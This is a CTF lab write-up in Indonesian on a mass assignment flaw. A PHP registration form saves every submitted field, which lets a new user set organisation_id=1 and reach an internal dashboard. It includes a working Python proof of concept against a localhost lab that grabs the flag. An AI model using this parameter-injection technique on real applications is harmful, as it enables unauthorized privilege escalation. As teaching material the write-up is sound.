---
title: Jadi Member
description: Writeup lab Jadi Member
tags:
  - access control
  - mass assignment
  - CTF
draft: false
---

## Summary
* Vuln Name: Mass Assignment
* Type: Broken access control
* Impact: Privilege Escalation
* Severity: High
* functionality: [[registration]], [[database]]

## Metodologi dan Observasi
1. Lab ini menggunakan mekanisme aplikasi (termasuk modul login dan registrasi) yang sangat mirip dengan lab [[jadi-admin]].
2. Pada file `register.php`, aplikasi menerima seluruh data yang dilempar dari form `$_POST`.
3. Aplikasi melakukan iterasi terhadap nilai-nilai form dengan mengekstraksi seluruh *keys* menggunakan fungsi bawaan PHP `array_keys()` untuk kemudian ditempel secara langsung ke dalam query `INSERT` pada [[database]].
4. Tidak ada batasan atau _filter_ (*allowlist*) terhadap apa saja yang diizinkan untuk dikirimkan melalui form.
5. Jika kita menilik alur Otorisasi pada file `dashboard.php`, terlihat bahwa hak masuk _Internal Organization_ didasarkan pada pemeriksaan variabel `$isInternal = ($orgId == 1);`.
6. Nilai ID Organisasi tersebut diperoleh berdasarkan kolom `organisation_id` milik *user* tersebut di *database*.
7. Sebagai penyerang, kita dapat mengeksploitasi bug [[mass-assignment]] ini dengan mengirimkan parameter tambahan `organisation_id=1` secara sembarang ketika melakukan proses pendaftaran.

## PoC
Skrip di bawah ini memperlihatkan bagaimana sebuah klien HTTP dapat menyuntikkan *Organisation ID* admin ke jalur registrasi.

```python
import requests
import re

url = "http://localhost:1337"
s = requests.Session()

# 1. Register: Menyuntikkan parameter organisation_id
s.post(f"{url}/register.php", data={
    "username": "hacker_org",
    "password": "123",
    "confirm_password": "123",
    "organisation_id": "1" # Mengeksploitasi Mass Assignment
})

# 2. Login
s.post(f"{url}/auth.php", data={
    "username": "hacker_org",
    "password": "123"
})

# 3. Akses Dashboard
res = s.get(f"{url}/dashboard.php")

# 4. Ambil bendera
if "Internal Organization Access Granted" in res.text:
    flag = re.search(r'pwn\{.*?\}', res.text).group(0)
    print(f"[+] Berhasil menyusup ke Org #1! Flag: {flag}")
```

## Impact
Seperti pada kasus-kasus eskalasi secara vertikal, penyerang bisa langsung memotong seluruh proteksi [[privilege-escalation]] dengan memanfaatkan pintu depan—yaitu form pendaftaran yang abai terhadap validasi batas ruang lingkup parameter entitas.
